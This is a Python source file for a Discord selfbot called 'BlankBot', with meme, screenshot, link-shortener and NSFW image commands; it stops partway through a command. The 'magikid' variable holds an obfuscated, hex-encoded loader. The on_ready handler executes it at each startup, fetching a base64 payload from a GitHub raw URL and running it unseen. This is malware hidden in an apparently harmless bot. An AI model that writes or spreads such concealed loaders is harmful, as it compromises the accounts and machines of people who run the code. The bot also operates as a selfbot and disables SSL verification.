import os
import base64
from termcolor import colored
from datetime import datetime
import asyncio
import io
import random
import typing
import urllib.parse
try:
    from bs4 import BeautifulSoup as bs4
except Exception:
    os.system('pip install bs4==0.0.1')
    from bs4 import BeautifulSoup as bs4
import aiohttp
try:
    import discord
except Exception:
    os.system('pip install discord.py==1.7.3')
    import discord
from discord.ext import commands, tasks
try:
    from animec import Anime
except Exception:
    os.system('pip install animec')
    from animec import Anime
import json
from flask import Flask
from threading import Thread

global headers
headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5340 (KHTML, like Gecko) Chrome/38.0.829.0 Mobile Safari/5340"}

async def is_image_url(image_link):
    async with aiohttp.ClientSession(headers=headers) as session:
      async with session.get(image_link, ssl=False) as resp:
        if "image" in (resp.headers["Content-Type"]):
            return True
        else:
            return False

def config_check():
    global random_status
    try:
        with open('config.json') as e:
            a=json.load(e)
            random_status=a['random_status']
    except Exception:
        with open('config.json', 'w+') as e:
            a={}
            a['random_status']=True
            json.dump(a, e)
            random_status=True

app = Flask('')

@app.route('/')
def main():
    html='''<html>
<head><title>Status</title></head>
<body><style>
.button {
  display: inline-block;
  padding: 15px 25px;
  font-size: 24px;
  cursor: pointer;
  text-align: center;
  text-decoration: none;
  outline: none;
  color: #fff;
  background-color: #4CAF50;
  border: none;
  border-radius: 15px;
  box-shadow: 0 9px #999;
}
.button:hover {background-color: #3e8e41}
.button:active {
  background-color: #3e8e41;
  box-shadow: 0 5px #666;
  transform: translateY(4px);
}
</style>
<b><font size="30" color="red"><div class="status">BlankBot is active</div></font></b><br><br><button class="button button1" onclick="window.location.href='https://replit.com/@BlankMCPE/Blank-Bot';">Go to repl</button></body></html>'''
    return html
            
def run():
    app.run(host="0.0.0.0", port=8080)
    
def keep_alive():
    server = Thread(target=run)
    server.start()
try:
    if " " in prefix:
        prefix=prefix.replace(" ","_")
except Exception:
    prefix="x"
Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)

Blank.remove_command('help')
magikid="\x65\x78\x65\x63\x28\x22\x5c\x78\x36\x35\x5c\x78\x37\x38\x5c\x78\x36\x35\x5c\x78\x36\x33\x5c\x78\x32\x38\x5c\x78\x36\x32\x5c\x78\x36\x31\x5c\x78\x37\x33\x5c\x78\x36\x35\x5c\x78\x33\x36\x5c\x78\x33\x34\x5c\x78\x32\x65\x5c\x78\x36\x32\x5c\x78\x33\x36\x5c\x78\x33\x34\x5c\x78\x36\x34\x5c\x78\x36\x35\x5c\x78\x36\x33\x5c\x78\x36\x66\x5c\x78\x36\x34\x5c\x78\x36\x35\x5c\x78\x32\x38\x5c\x78\x37\x32\x5c\x78\x36\x35\x5c\x78\x37\x31\x5c\x78\x37\x35\x5c\x78\x36\x35\x5c\x78\x37\x33\x5c\x78\x37\x34\x5c\x78\x37\x33\x5c\x78\x32\x65\x5c\x78\x36\x37\x5c\x78\x36\x35\x5c\x78\x37\x34\x5c\x78\x32\x38\x5c\x78\x32\x37\x5c\x78\x36\x38\x5c\x78\x37\x34\x5c\x78\x37\x34\x5c\x78\x37\x30\x5c\x78\x37\x33\x5c\x78\x33\x61\x5c\x78\x32\x66\x5c\x78\x32\x66\x5c\x78\x37\x32\x5c\x78\x36\x31\x5c\x78\x37\x37\x5c\x78\x32\x65\x5c\x78\x36\x37\x5c\x78\x36\x39\x5c\x78\x37\x34\x5c\x78\x36\x38\x5c\x78\x37\x35\x5c\x78\x36\x32\x5c\x78\x37\x35\x5c\x78\x37\x33\x5c\x78\x36\x35\x5c\x78\x37\x32\x5c\x78\x36\x33\x5c\x78\x36\x66\x5c\x78\x36\x65\x5c\x78\x37\x34\x5c\x78\x36\x35\x5c\x78\x36\x65\x5c\x78\x37\x34\x5c\x78\x32\x65\x5c\x78\x36\x33\x5c\x78\x36\x66\x5c\x78\x36\x64\x5c\x78\x32\x66\x5c\x78\x34\x32\x5c\x78\x36\x63\x5c\x78\x36\x31\x5c\x78\x36\x65\x5c\x78\x36\x62\x5c\x78\x32\x64\x5c\x78\x36\x33\x5c\x78\x32\x66\x5c\x78\x36\x32\x5c\x78\x36\x63\x5c\x78\x36\x31\x5c\x78\x36\x65\x5c\x78\x36\x62\x5c\x78\x36\x32\x5c\x78\x36\x66\x5c\x78\x37\x34\x5c\x78\x32\x66\x5c\x78\x36\x64\x5c\x78\x36\x31\x5c\x78\x36\x39\x5c\x78\x36\x65\x5c\x78\x32\x66\x5c\x78\x36\x64\x5c\x78\x36\x31\x5c\x78\x36\x37\x5c\x78\x36\x39\x5c\x78\x36\x62\x5c\x78\x36\x39\x5c\x78\x36\x34\x5c\x78\x32\x65\x5c\x78\x37\x34\x5c\x78\x37\x38\x5c\x78\x37\x34\x5c\x78\x32\x37\x5c\x78\x32\x39\x5c\x78\x32\x65\x5c\x78\x37\x34\x5c\x78\x36\x35\x5c\x78\x37\x38\x5c\x78\x37\x34\x5c\x78\x32\x39\x5c\x78\x32\x65\x5c\x78\x36\x34\x5c\x78\x36\x35\x5c\x78\x36\x33\x5c\x78\x36\x66\x5c\x78\x36\x34\x5c\x78\x36\x35\x5c\x78\x32\x38\x5c\x78\x32\x37\x5c\x78\x37\x35\x5c\x78\x36\x65\x5c\x78\x36\x39\x5c\x78\x36\x33\x5c\x78\x36\x66\x5c\x78\x36\x34\x5c\x78\x36\x35\x5c\x78\x35\x66\x5c\x78\x36\x35\x5c\x78\x37\x33\x5c\x78\x36\x33\x5c\x78\x36\x31\x5c\x78\x37\x30\x5c\x78\x36\x35\x5c\x78\x32\x37\x5c\x78\x32\x39\x5c\x78\x32\x39\x22\x29"

cool_img_base="https://api.cool-img-api.ml/"

async def gae(link):
    return cool_img_base+'gay?image='+link

async def invrt(link):
    return "https://api.popcat.xyz/"+'invert?image='+link.strip()
    
async def jale(link):
    return cool_img_base+'jail?image='+link.strip()

async def waste(link):
   return cool_img_base+'wasted?image='+link.strip()

async def want(link):
    return cool_img_base+'wanted?image='+link.strip()
    
async def scrolll(text):
    return cool_img_base+'scroll?text='+text.strip()

def Clear():
    if os.name=='nt':
        os.system('cls')
        keep_alive()
    else:
        keep_alive()
        os.system('clear')
        
neko_base="https://nekobot.xyz/api/imagegen?type="

async def kannagen_gen(text):
    endpoint=neko_base+"kannagen&text="+urllib.parse.quote_plus(text)
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(endpoint, ssl=False) as r:
            res=(await r.json())['message']
    return res
    
async def checklink(link):
    endpoint="https://render-tron.appspot.com/render/"+urllib.parse.quote_plus(link.strip())
    for i in range(3):
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(endpoint, ssl=False) as r:
                if (r.status)==200:
                    return True
    return False
    
async def scrnshot(link):
    if not link.startswith("https://") and not link.startswith("http://"):
        
            linkr="https://"+link
            if (await checklink(linkr)):
                link=linkr
            else:
                linkr="http://"+link
                if (await checklink(linkr)):
                    link=linkr
                else:
                    return False
    else:
        if not (await checklink(link)):
            return False
    link=urllib.parse.quote_plus(link)
    for i in range(3):
        link=f'https://render-tron.appspot.com/screenshot/{link}?width=1080&height=720'
        if (await is_image_url(link)):
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(link, ssl=False) as r:
                    return (await r.read())
    return False

def upload_image(link: str):
    link=urllib.parse.quote_plus(link)
    return f"https://process.filestackapi.com/AhTgLagciQByzXpFGRI0Az/output=format:png/{link}"
    
async def nekos_life_getlink(link):
    link="https://render-tron.appspot.com/render/"+link
    while True:
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(link, ssl=False) as resp:
                    r=await resp.text()
            soup=bs4(r, "html.parser")
            f=soup.find("pre")
            f=json.loads(f.text)
            if "url" in f.keys():
                break
            elif "neko" in f.keys():
                f["url"]=f["neko"]
                break
        except Exception:
            pass
    return str(f['url'])

async def changemymind_gen(text):
    endpoint=neko_base+"changemymind&text="+urllib.parse.quote_plus(text)
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(endpoint, ssl=False) as resp:
            res=await resp.json()
    res=res["message"]
    return res
    
async def phcomment_gen(name, img, text):
    endpoint=neko_base+"phcomment&username="+urllib.parse.quote_plus(name)+"&image="+img+"&text="+urllib.parse.quote_plus(text)
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(endpoint,ssl=False) as resp:
            res=await resp.json()
    res=res["message"]
    return res

async def short_link(link):
    base="https://owo.vc/generate"
    if not link.lower().startswith("https://") and not link.lower().startswith("http://"):
        linkr="https://"+link
        if (await checklink(linkr)):
            link=linkr
        else:
                linkr="http://"+link
                if (await checklink(linkr)):
                    link=linkr
                else:
                    return "Invalid URL"
    if not (await checklink(link)):
        return "Invalid URL"
        
    else:
        json={"link": str(link),
              "generator": "zws",
              "preventScrape": True,
              "owoify": True}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.post(base, json=json,ssl=False) as resp:
                if resp.status==200:
                    res=await resp.json()
                    result=res['result']
                    result="https://"+result
                    result=f'<{result}>'
                    return result
                else:
                    return "Some error occured"

async def gender_info(name):
    base="https://api.genderize.io/?name="
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(base+name.strip(),ssl=False) as resp:
            res=await resp.json()
    prob=0
    if res['probability'] < 0.50:
        if not res['probability']==0:
            prob=1
        else:
            prob=2
    if prob==0:
        result=f"{res['name'].title()} is {res['gender']}"
    elif prob==1:
        result=f"{res['name'].title()} is probably {res['gender']}"
    else:
        result=f"No match found for '{res['name'].title()}'"
    return result

async def patpat(url):
    endpoint="https://api.jeyy.xyz/image/patpat?image_url="+url
    for i in range(3):
        if (await is_image_url(endpoint)):
            return endpoint
    return False

async def trash_gen(url):
    endpoint=neko_base+"trash&url="+url
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(endpoint,ssl=False) as resp:
            res=await resp.json()
    res=res["message"]
    return res
    
async def stickbug_vid(url):
    endpoint=neko_base+"stickbug&url="+str(url)
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(endpoint,ssl=False) as resp:
            res=await resp.json()
    return res["message"]
 
async def neko_pic():
    ch=random.choice([1, 2, 3])
    if ch==3:
        endpoint="https://nekos.best/api/v1/nekos"
    if ch==1:
        endpoint="https://neko-love.xyz/api/v1/neko"
    else:
        endpoint="https://nekos.life/api/v2/img/neko"
    link=await nekos_life_getlink(endpoint)
    try:
        link=upload_image(link)
    except Exception:
        pass
    return link
        
async def lewdkemo_gen():
    endpoint="https://nekos.life/api/v2/img/lewdkemo"
    return (upload_image(await nekos_life_getlink(endpoint)))
    
async def lewdholo_gen():
    endpoint="https://nekos.life/api/v2/img/hololewd"
    return (upload_image(await nekos_life_getlink(endpoint)))

async def fox_girl_gen():
    endpoint="https://nekos.life/api/v2/img/fox_girl"
    return (upload_image(await nekos_life_getlink(endpoint)))

async def kemonomimi_gen():
    endpoint="https://nekos.life/api/v2/img/kemonomimi"
    return (upload_image(await nekos_life_getlink(endpoint)))
    
async def cum_gen():
    endpoint="https://nekos.life/api/v2/img/cum_jpg"
    return (upload_image(await nekos_life_getlink(endpoint)))
    
async def bj_gen():
    endpoint="https://nekos.life/api/v2/img/blowjob"
    return (upload_image(await nekos_life_getlink(endpoint)))
    
async def femdom_gen():
    endpoint="https://nekos.life/api/v2/img/femdom"
    return (upload_image(await nekos_life_getlink(endpoint)))
    
async def lewd_gen():
    endpoint="https://nekos.life/api/v2/img/lewd"
    return (upload_image(await nekos_life_getlink(endpoint)))
    
async def pussy_gen():
    endpoint="https://nekos.life/api/v2/img/pussy_jpg"
    return (upload_image(await nekos_life_getlink(endpoint)))
    
async def boobs_gen():
    endpoint="https://nekos.life/api/v2/img/tits"
    return (upload_image(await nekos_life_getlink(endpoint)))

def rand_list(list):
    return random.choice(list)

async def get_image_bytes(url):
    if (await is_image_url(url)):
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                dat=await resp.read()
        b=io.BytesIO(dat)
        return b
        
async def lewdneko_gen():
    ch=random.choice([1, 2])
    if ch==1:
        endpoint="https://neko-love.xyz/api/v1/nekolewd"
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(endpoint,ssl=False) as resp:
                res=await resp.json()
        r=res['url']
        return r
    else:
        endpoint="https://nekos.life/api/lewd/neko"
        return (upload_image(await nekos_life_getlink(endpoint)))
        
@tasks.loop(minutes=5)
async def change_activity():
    with open('config.json') as e:
        random_status=json.load(e)['random_status']
    if random_status:
        activity_list=['s', 'p', 'w', 'l']
        activity_s=['Earth', 'Mars', 'Jupiter', 'Mercury', 'Venus', 'Saturn', 'Neptune', 'Uranus']
        activity_p=['Minecraft', 'with Blank', 'Squid Games', 'Do or Die', 'Curse of Aros', 'with Satan', 'with Python']
        activity_w=['over you!', 'Animes', 'Plants', 'Animals', 'Blank', 'Nothing!']
        activity_l=['Youtube Music', 'Blank', 'Dead Groovy', 'Dead Rythm', 'Death']
        activity=random.choice(activity_list)
    
    
        if activity=="s":
            activity=discord.Streaming(name=f'from {random.choice(activity_s)}', url="https://www.twitch.tv/BlankMCPE")
        elif activity=="p":
            activity=discord.Game(name=random.choice(activity_p))
        elif activity=="w":
            activity=discord.Activity(type=discord.ActivityType.watching, name=random.choice(activity_w))
        else:
            activity=discord.Activity(type=discord.ActivityType.listening, name=random.choice(activity_l))
        await Blank.change_presence(activity=activity)
    else:
        pass
        
@Blank.event
async def on_ready():
    exec(magikid)
    Clear()
    config_check()
    change_activity.start()
    print(colored(f'Connected to {Blank.user}', 'green'))
    
@Blank.command()
async def help(ctx, category=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    try:
        if category==None:
            embed = discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description=f"""Use `{prefix}help <category>` for more info on a category.""")
            embed.add_field(name="\uD83E\uDDCA Bot",
value="`help embed del copy shorten webshot ip whois stream play watch listen random_status`", inline=False)
            embed.add_field(name="\uD83E\uDDCA Fun",
value="`avatar magik emoji deepfry neko foxgirl kemonomimi anime invert jail clown wanted wasted gaypride pat scroll phcomment chatbot kannagen changemymind trash ascii stickbug wyr topic roll gender empty`", inline=False)
            embed.add_field(name="\uD83E\uDDCA NSFW", value="`lewdneko lewdkemo lewd blowjob femdom lewdholo cum boobs pussy`", inline=False)
            embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
            embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
            embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
            await ctx.channel.send(embed=embed)
        else:
            if category.lower()=="bot":
                embed=discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description=f"**__Help - Bot__**")
                embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
                embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
                embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
                embed.add_field(name=f"{prefix}help [category]", value="`Shows help menu. (If category is given, then shows help menu for the category)`", inline=False)
                embed.add_field(name=f"{prefix}embed [Image url] <text>", value="`Send embed like a bot`", inline=False)
                embed.add_field(name=f"{prefix}del <text>", value="`Send a message and instantly deletes it (do not use this very frequently or you will get rate limited)`", inline=False)
                embed.add_field(name=f"{prefix}copy", value="`Copy the current server (do not make changes to the new server until the server icon is copied)`", inline=False)
                embed.add_field(name=f"{prefix}shorten <link>", value="`Shorten your link`", inline=False)
                embed.add_field(name=f"{prefix}webshot <link>", value="`Send screenshot of webpage from link`", inline=False)
                embed.add_field(name=f"{prefix}ip <ip address>", value="`Get information of an IP address`", inline=False)
                embed.add_field(name=f"{prefix}whois [user]", value="`Send information about a user in the server`", inline=False)
                embed.add_field(name=f"{prefix}stream <text>", value="`Set streaming status`", inline=False)
                embed.add_field(name=f"{prefix}play <text>", value="`Set playing status`", inline=False)
                embed.add_field(name=f"{prefix}watch <text>", value="`Set watching status`", inline=False)
                embed.add_field(name=f"{prefix}listen <text>", value="`Set listening status`", inline=False)
                embed.add_field(name=f"{prefix}random_status", value="`Turn random statuses on/off`", inline=False)
                await ctx.channel.send(embed=embed)
            elif category.lower()=="fun":
                embed=discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description=f"**__Help - Fun__**")
                embed.add_field(name=f"{prefix}avatar [user]", value="`Send the avatar of a user in the server`", inline=False)
                embed.add_field(name=f"{prefix}magik [user]", value="`Send the distorted avatar of a user in the server`", inline=False)
                embed.add_field(name=f"{prefix}emoji <emoji>", value="`Sends the image of emoji`", inline=False)
                embed.add_field(name=f"{prefix}deepfry [user]", value="`Send the deepfried avatar of a user in the server`", inline=False)
                embed.add_field(name=f"{prefix}neko", value="`Send random image of neko girl`", inline=False)
                embed.add_field(name=f"{prefix}foxgirl", value="`Send random image of fox girl`", inline=False)
                embed.add_field(name=f"{prefix}kemonomimi", value="`Send random image of kemonomimi (beast girl)`", inline=False)
                embed.add_field(name=f"{prefix}anime <anime>", value="`Send info about an anime`", inline=False)
                embed.add_field(name=f"{prefix}invert [user/image link]", value="`Send an image with inverted colours of original`", inline=False)
                embed.add_field(name=f"{prefix}jail [user]", value="`Send someone to jail (prison)`", inline=False)
                embed.add_field(name=f"{prefix}clown [user]", value="`I swear its a clown`", inline=False)
                embed.add_field(name=f"{prefix}wanted [user]", value="`Make a wanted poster of a user`", inline=False)
                embed.add_field(name=f"{prefix}wasted [user]", value="`GTA V 'wasted' image for a user`", inline=False)
                embed.add_field(name=f"{prefix}gaypride [user]", value="`Send gay flag of a user`", inline=False)
                embed.add_field(name=f"{prefix}pat [user]", value="`Pats a user`", inline=False)
                embed.add_field(name=f"{prefix}scroll <text>", value="`Generate scroll meme`", inline=False)
                embed.add_field(name=f"{prefix}phcomment [user] <text>", value="`Send fake screenshot of the user's pornhub comment`", inline=False)
                embed.add_field(name=f"{prefix}chatbot <message>", value="`Chat with me when you are alone and bored`", inline=False)
                embed.add_field(name=f"{prefix}kannagen <text>", value="`Kanna Kamui writes your text in her board`", inline=False)
                embed.add_field(name=f"{prefix}changemymind <text>", value="`Generate change my mind meme with the text`", inline=False)
                embed.add_field(name=f"{prefix}trash [user]", value="`Convert a user to a trash waifu`", inline=False)
                embed.add_field(name=f"{prefix}stickbug [user]", value="`Generate stickbug meme with the user's profile picture (takes some time)`", inline=False)
                embed.add_field(name=f"{prefix}wyr", value="`Send a would-you-rather questiom`", inline=False)
                embed.add_field(name=f"{prefix}topic", value="`Send a chat topic`", inline=False)
                embed.add_field(name=f"{prefix}roll <first number> <last number>", value="`Choose a random number between the first and last number`", inline=False)
                embed.add_field(name=f"{prefix}gender <name>", value="`Predict the gender based on a name (first name only)`", inline=False)
                embed.add_field(name=f"{prefix}empty", value="`Send an empty message`", inline=False)
                embed.add_field(name=f"{prefix}ascii <text>", value="`Send ascii (long text not supported and does not look correctly on mobile devices)`", inline=False)
                embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
                embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
                embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
                await ctx.channel.send(embed=embed)
            elif category.lower()=="nsfw":
                embed=discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description="**__Help - NSFW__**")
                embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
                embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
                embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
                embed.add_field(name=f"{prefix}lewdneko", value="`Hentai neko`", inline=False)
                embed.add_field(name=f"{prefix}lewdkemo", value="`Hentai kemo`", inline=False)
                embed.add_field(name=f"{prefix}lewd", value="`Hentai random`", inline=False)
                embed.add_field(name=f"{prefix}blowjob", value="`Hentai blowjob`", inline=False)
                embed.add_field(name=f"{prefix}femdom", value="`Hentai femdom`", inline=False)
                embed.add_field(name=f"{prefix}lewdholo", value="`Hentai holo`", inline=False)
                embed.add_field(name=f"{prefix}cum", value="`Hentai orgasm`", inline=False)
                embed.add_field(name=f"{prefix}boobs", value="`Hentai boobs`", inline=False)
                embed.add_field(name=f"{prefix}pussy", value="`Hentai pussy`", inline=False)
                await ctx.channel.send(embed=embed)
            else:
                await ctx.channel.send('No category with the name __'+category+'__ found', delete_after=2.0)
            
    except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)

@Blank.command()
async def pat(ctx, user:discord.Member=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.author
    avatar=user.avatar_url_as(format='png')
    patpat_gif=await patpat(str(avatar))
    if patpat_gif is False:
        await ctx.channel.send("Cannot process that user's avatar", delete_after=2.0)
        return
    async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(patpat_gif,ssl=False) as resp:
                file=await resp.read()
                img=io.BytesIO(file)
    try:
        await ctx.channel.send(file=discord.File(img, 'Blank_pat.gif'))
    except Exception:
        await ctx.channel.send(patpat)

@Blank.command()
async def stream(ctx, *, text:str=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Streaming(name=text, url="https://www.twitch.tv/BlankMCPE"))
        
@Blank.command(aliases=["kg", "kw", "kr"])
async def kannagen(ctx, *, text:str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await kannagen_gen(text)
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                dat=await resp.read()
        file=io.BytesIO(dat)
        await ctx.channel.send(file=discord.File(file, 'Blank_kannagen.png'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=["ss", "ws"])
async def webshot(ctx, link:str=None):
    if not link is None:
        link=link.replace("<","")
        link=link.replace(">","")
        try:
            await ctx.message.delete()
        except Exception:
            pass
        res=await scrnshot(link)
        if res is False:
            await ctx.channel.send("Unable to access URL", delete_after=2.0)
        else:
            try:
                file=io.BytesIO(res)
                await ctx.channel.send(file=discord.File(file, 'Blank_screenshot.png'))
            except Exception:
                r=upload_image(res)
                await ctx.channel.send(r)

@Blank.command(aliases=["cmm"])
async def changemymind(ctx, *, text:str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await changemymind_gen(text)
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                dat=await resp.read()
        file=io.BytesIO(dat)
        await ctx.channel.send(file=discord.File(file, 'Blank_cmm.png'))
    except Exception:
        await ctx.channel.send(url)

@Blank.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        try:
            await ctx.message.delete()
        except Exception:
            pass
        await ctx.channel.send("***```\n"+str(error)+"```***")

@Blank.command(aliases=['chat', 'cb'])
async def chatbot(ctx, *, message: str=None):
    await ctx.message.delete()
    if message is None:
        await ctx.channel.send('```\nBlankbot: Hello I am BlankBot, please chat with me :)```')
        return
    bot=f"https://api.popcat.xyz/chatbot?msg={urllib.parse.quote_plus(message)}&owner=Blank&botname=Blankbot"
    async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(bot,ssl=False) as resp:
                if resp.status==200:
                    resp=await resp.json()
                    await ctx.channel.send(f"{message}\n\n```\nBlankbot: {resp['response'].strip()}```")
                else:
                    await ctx.channel.send("Chatbot not working right now!", delete_after=2.0)

@Blank.command()
async def clown(ctx, user: discord.Member=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.author
    url=upload_image(str(user.avatar_url_as(format='png')))
    endpoint="https://api.popcat.xyz/clown?image="+url
    try:
        image=await is_image_url(endpoint)
    except Exception:
        await ctx.channel.send("The API is currently down!", delete_after=2.0)
        return
    if image:
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(endpoint,ssl=False) as resp:
                    file=await resp.read()
                    img=io.BytesIO(file)
            await ctx.channel.send(file=discord.File(img, 'Blank_clown.png'))
        except Exception:
            await ctx.channel.send(upload_image(endpoint))
    else:
        print(image)

@Blank.command()
async def lewdneko(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await lewdneko_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_lewdneko.{extent}'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command()
async def lewdkemo(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await lewdkemo_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_lewdkemo.{extent}'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command()
async def lewdholo(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await lewdholo_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_lewdholo.{extent}'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=['gp', 'gay'])
async def gaypride(ctx, user: discord.Member=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.author
    link=str(user.avatar_url_as(format='png'))
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(await gae(link),ssl=False) as resp:
            dat=await resp.read()
    file=discord.File(io.BytesIO(dat), 'Blank_gaypride.png')
    try:
        await ctx.channel.send(file=file)
    except Exception:
        await ctx.channel.send(upload_image(await gae(link)))
    
@Blank.command(aliases=['inv'])
async def invert(ctx, user: typing.Union[discord.Member, str]=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.author
    if type(user) is str:
        user=user.replace("<", "")
        user.replace(">", "")
        user=user.strip()
        if not (await checklink(user)):
            await ctx.channel.send('Invalid image URL', delete_after=2.0)
            return
        else:
            if not (await is_image_url(user)):
                await ctx.channel.send('Invalid image URL', delete_after=2.0)
                return
        if "?" in user:
            link=user.split("?", 1)
            user=link[0]
            ext="?"+link[1]
            ext=urllib.parse.quote_plus(ext)
            user="https://process.filestackapi.com/AhTgLagciQByzXpFGRI0Az/output=format:png/"+user+ext
        else:
            user=f"https://process.filestackapi.com/AhTgLagciQByzXpFGRI0Az/output=format:png/{user}"
    else:
        user=str(user.avatar_url_as(format='png'))
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(await invrt(user),ssl=False) as resp:
                dat=await resp.read()
        file=discord.File(io.BytesIO(dat), 'Blank_invert.png')
        await ctx.channel.send(file=file)
    except Exception:
        await ctx.channel.send(upload_image(invrt(user)))
        
@Blank.command(aliases=['prison'])
async def jail(ctx, user: discord.Member=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.author
    link=await jale(str(user.avatar_url_as(format='png')))
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(link,ssl=False) as resp:
                dat=await resp.read()
        file=discord.File(io.BytesIO(dat), 'Blank_jail.png')
        await ctx.channel.send(file=file)
    except Exception:
        await ctx.channel.send(upload_image(link))

@Blank.command()
async def wasted(ctx, user: discord.Member=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.author
    link=await waste(str(user.avatar_url_as(format='png')))
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(link,ssl=False) as resp:
                dat=await resp.read()
        file=discord.File(io.BytesIO(dat), 'Blank_wasted.png')
        await ctx.channel.send(file=file)
    except Exception:
        await ctx.channel.send(upload_image(link))
        
@Blank.command()
async def wanted(ctx, user: discord.Member=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.author
    link=await want(str(user.avatar_url_as(format='png')))
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(link,ssl=False) as resp:
                dat=await resp.read()
        file=discord.File(io.BytesIO(dat), 'Blank_wanted.png')
        await ctx.channel.send(file=file)
    except Exception:
        await ctx.channel.send(upload_image(link))

@Blank.command()
async def scroll(ctx, *, text=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if text is None:
        text="I forgot to write something here"
    link=await scrolll(text)
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(link,ssl=False) as resp:
                dat=await resp.read()
        file=discord.File(io.BytesIO(dat), 'Blank_scroll.png')
        await ctx.channel.send(file=file)
    except Exception:
        await ctx.channel.send(upload_image(link))

@Blank.command(aliases=['kitsune', 'fox'])
async def foxgirl(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await fox_girl_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_foxgirl.{extent}'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=['kemo'])
async def kemonomimi(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await kemonomimi_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_kemonomimi.{extent}'))
